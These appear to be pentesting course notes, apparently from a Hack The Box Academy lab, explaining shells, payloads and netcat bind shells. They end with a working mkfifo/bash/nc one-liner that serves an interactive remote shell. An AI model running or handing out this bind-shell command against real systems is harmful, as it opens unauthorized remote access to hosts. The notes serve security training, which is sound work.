- [Shells \& Payloads](#shells--payloads)
  - [Intro](#intro)
  - [Shell Basics](#shell-basics)
    - [Bind Shells](#bind-shells)
      - [Using Netcat](#using-netcat)
      - [Using Netcat - Bind Shell](#using-netcat---bind-shell)

---

# Shells & Payloads

## Intro

A shell is a program that provides a computer user with an interface to input instructions into the system and view text output. As pentesters and information security professionals, a shell is often the result of exploiting a vuln or bypassing security measures to gain interactive access to a host.

Establishing a shell also allows you to maintain persistence on the system, giving you more time to work. It can make it easier to use your attack tools, exfiltrate data, gather, store and document all the details of your attack.

In this context, a payload means a code crafted with the intent to exploit a vuln on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.

## Shell Basics

### Bind Shells

With a bind shell, the target system has a listener started and awaits a connection from a pentester's system.

#### Using Netcat

Once connected to the target box with ssh, start a nc listener:

```bash
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

In this instance, the target will be your server, and the attack box will be your client. Once you hit enter, the listener is started and awaiting a connection from the client.

Back on the client, you will use nc to connect to the listener you started on the server.

```bash
d41y@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Connecting was successful, also on the server:

```bash
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!   
```

That is not a proper shell though. It is just a nc TCP session you have established. You can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

Client:

```bash
d41y@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy  
```

Server:

```bash
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy  
```

#### Using Netcat - Bind Shell

On the server side, you will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.

```bash
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The commands and conde in your payload will differ depending on the host OS you are delivering it to.

Back on the client, use nc to connect to the server now that a shell on the server is being served.

```bash
d41y@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```

